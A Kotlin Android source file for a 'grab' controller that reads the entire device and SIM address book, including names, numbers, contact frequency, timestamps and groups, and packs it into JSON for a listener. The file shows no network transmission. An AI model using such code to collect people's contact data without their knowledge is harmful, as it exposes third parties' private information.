package com.qit.contact

import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.util.Log
import com.qit.base.GrabController
import com.qit.base.Util
import org.json.JSONArray
import org.json.JSONObject

class ContactController(private val context: Context) : GrabController() {

    override fun doCall() {
        runWorkThread(Runnable {
            mListener?.onReceive(mType, queryContacts())
        })
    }

    /**
     * 查询通讯录
     */
    private fun queryContacts(): String {
        val list = queryContacts(0, -1)
        val contactArray = JSONArray()
        if (list.isNotEmpty()) {
            for (item in list) {
                val contactItem = JSONObject()
                try {
                    contactItem.put("name", Util.filterOffUtf8Mb4(item.name))
                    contactItem.put("phone", Util.filterOffUtf8Mb4(item.number))
                    contactItem.put("source", item.type)
                    contactItem.put("contactTimes", item.contactTimes)
                    contactItem.put("lastContactTime", item.lastContactTime)
                    contactItem.put("lastUpdateTime", item.lastUpdateTime)
                    contactItem.put("lastUsedTime", item.lastUsedTime)
                    contactItem.put("groups", JSONArray(item.groups))
                    contactArray.put(contactItem)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        return contactArray.toString()
    }

    /**
     * 获取通讯录信息
     *
     * @param id     , 通讯录id， 取列表中最小的一个
     * @param limit, 一次取的个数
     */
    private fun queryContacts(id: Long, limit: Long): List<ContactEntity> {
        val allFriendInfoList = ArrayList<ContactEntity>()
        try {
            allFriendInfoList.addAll(fillDetailInfo(id, limit))
            allFriendInfoList.addAll(getSimContactInfoList())
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            return allFriendInfoList
        }
    }

    /**
     * 得到手机SIM卡联系人人信息
     *
     */
    private fun getSimContactInfoList(): ArrayList<ContactEntity> {
        val simFriendInfos = ArrayList<ContactEntity>()
        val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (manager.simState != TelephonyManager.SIM_STATE_READY) {
            return simFriendInfos
        }

        val resolver = context.contentResolver
        // 获取Sims卡联系人
        val uri = Uri.parse("content://icc/adn")
        val phoneCursor = resolver.query(uri, PHONES_PROJECTION, null, null, null)
        if (phoneCursor == null) {
            phoneCursor?.close()
            return simFriendInfos
        }

        while (phoneCursor.moveToNext()) {
            val columnIndex = phoneCursor.getColumnIndex(ContactsContract.Contacts._ID)
            val id = phoneCursor.getLong(columnIndex)
            // 得到手机号码
            val phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex("number"))
            // 当手机号码为空的或者为空字段 跳过当前循环
            if (TextUtils.isEmpty(phoneNumber))
                continue
            // 得到联系人名称
            val contactName = phoneCursor.getString(phoneCursor.getColumnIndex("name"))

            val friendInfo = ContactEntity()
            friendInfo.name = contactName
            friendInfo.number = phoneNumber
            friendInfo.type = SIM
            friendInfo.id = id
            friendInfo.groups = queryGroups(id)
            simFriendInfos.add(friendInfo)
        }
        phoneCursor.close()
        return simFriendInfos
    }

    /**
     * 填充详细信息
     */
    private fun fillDetailInfo(id: Long, limit: Long): ArrayList<ContactEntity> {
        val phoneFriendInfoList = ArrayList<ContactEntity>()

        val cr = context.contentResolver
        var projection = arrayOf(
            ContactsContract.Contacts._ID
            , ContactsContract.Contacts.HAS_PHONE_NUMBER
            , ContactsContract.Contacts.DISPLAY_NAME
        )
        var selection = ContactsContract.Contacts._ID + " > " + id
        val sort = ContactsContract.Contacts._ID
        var queryUri: Uri = if (limit > 0) {
            ContactsContract.Contacts.CONTENT_URI.buildUpon()
                .appendQueryParameter(LIMIT_PARAM_KEY, limit.toString()).build()
        } else {
            ContactsContract.Contacts.CONTENT_URI
        }
        val cursor = cr.query(queryUri, projection, selection, null, sort)

        if (cursor == null || cursor.count == 0) {
            cursor?.close()
            return phoneFriendInfoList
        }

        while (cursor.moveToNext()) {
            queryUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ? "

            val args = arrayOfNulls<String>(1)
            val builder = StringBuilder()

            // contact_id
            var columnIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val rawId = cursor.getLong(columnIndex)
            // has_phone_number
            val hasPhoneColumnIndex =
                cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)
            val hasPhone = hasPhoneColumnIndex > 0 && cursor.getInt(hasPhoneColumnIndex) > 0
            // display_name
            val displayNameColumnIndex =
                cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val displayName = cursor.getString(displayNameColumnIndex)


            val friendInfo = ContactEntity()
            friendInfo.id = rawId
            friendInfo.groups = queryGroups(rawId)
            var phoneNumber = ""
            if (hasPhone) {    //没有电话号码过滤该号码
                args[0] = rawId.toString()

                projection =
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                        , ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
                        , ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED
                        , ContactsContract.CommonDataKinds.Phone.TIMES_USED
                        , ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED
                        , ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP
                    )

                val phoneCur = cr.query(queryUri, projection, selection, args, null)
                if (phoneCur == null || phoneCur.count <= 0) {
                    //没有电话号码，过滤该号码
                    phoneCur?.close()
                    continue
                }

                builder.delete(0, builder.length)

                while (phoneCur.moveToNext()) {

                    val timesContactsColumnIndex = phoneCur
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED)
                    friendInfo.contactTimes = phoneCur.getString(timesContactsColumnIndex)

                    val lastTimeUsedColumnIndex = phoneCur
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED)
                    friendInfo.lastUsedTime = phoneCur.getLong(lastTimeUsedColumnIndex)

                    val lastTimeContactedColumnIndex = phoneCur
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED)
                    friendInfo.lastContactTime = phoneCur.getLong(lastTimeContactedColumnIndex)

                    val lastUpdateTimeUsedColumnIndex = phoneCur
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP)
                    friendInfo.lastUpdateTime = phoneCur.getLong(lastUpdateTimeUsedColumnIndex)

                    columnIndex = phoneCur
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    if (columnIndex < 0)
                        continue

                    val phone = phoneCur.getString(columnIndex)
                    if (!Util.isValidChinaChar(phone)) {
                        builder.append(phone)
                        if (!phoneCur.isLast) {
                            builder.append(",")
                        }
                    }
                }

                phoneCur.close()
                phoneNumber = builder.toString()
            }

            friendInfo.name = displayName
            friendInfo.type = DEVICE
            if (hasPhone) {
                friendInfo.number = phoneNumber
            } else /*if (!Util.isValidChinaChar(displayName))*/ {
                friendInfo.number = displayName
            }
            phoneFriendInfoList.add(friendInfo)
        }
        return phoneFriendInfoList
    }

    fun getPhoneContactsBySys(uri: Uri): Contact {
        var name = ""
        var phone = ""
        var groups = ArrayList<String>()
        val cr = context.contentResolver
        try {
            val cursor = cr.query(uri, null, null, null, null)
            if (cursor != null) {
                cursor.moveToFirst()
                val nameFieldColumnIndex =
                    cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                name = cursor.getString(nameFieldColumnIndex)

                val contactId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                val phoneCursor = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                    null,
                    null
                )

                val sbPhoneNumber = StringBuilder()
                if (phoneCursor != null) {
                    var columnIndex: Int
                    while (phoneCursor.moveToNext()) {
                        columnIndex = phoneCursor
                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (columnIndex < 0) {
                            continue
                        }
                        sbPhoneNumber.append(phoneCursor.getString(columnIndex))
                        if (!phoneCursor.isLast) {
                            sbPhoneNumber.append(",")
                        }
                    }
                    phone = sbPhoneNumber.toString()
                    phoneCursor.close()
                }
                groups = queryGroups(contactId)
                cursor.close()
            } else {
                Log.v("", "get LoadContacts is fail")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return Contact(name, phone, groups)

    }

    private fun queryGroups(rawId: Long): ArrayList<String> {
        val groupNameArray = ArrayList<String>()
        val cr = context.contentResolver
        val groupCursor = cr.query(
            ContactsContract.Data.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID),
            ContactsContract.CommonDataKinds.GroupMembership.MIMETYPE + "='" + ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE + "' AND " + ContactsContract.Data.RAW_CONTACT_ID + " = " + rawId,
            null,
            null
        )
// Second, get all the corresponding group names
        while (groupCursor?.moveToNext()!!) {
            val groupNameCursor = cr.query(
                ContactsContract.Groups.CONTENT_URI,
                arrayOf(ContactsContract.Groups.TITLE),
                ContactsContract.Groups._ID + "=" + groupCursor.getInt(0),
                null,
                null
            )
            groupNameCursor?.moveToNext()
            groupNameCursor?.getString(0)?.let { groupNameArray.add(it) }
            groupNameCursor?.close()
        }
        groupCursor.close()
        return groupNameArray
    }

    companion object {
        private const val DEVICE = "device"
        private const val SIM = "sim"

        /**
         * 获取联系人的相关字段表字段
         */
        private val PHONES_PROJECTION = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
            , ContactsContract.CommonDataKinds.Phone.NUMBER
            , ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED
            , ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
            , ContactsContract.CommonDataKinds.Photo.PHOTO_ID,
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
        )
        private const val LIMIT_PARAM_KEY = "limit"
    }


    data class Contact(var name: String, var phone: String, var groups: ArrayList<String>)
}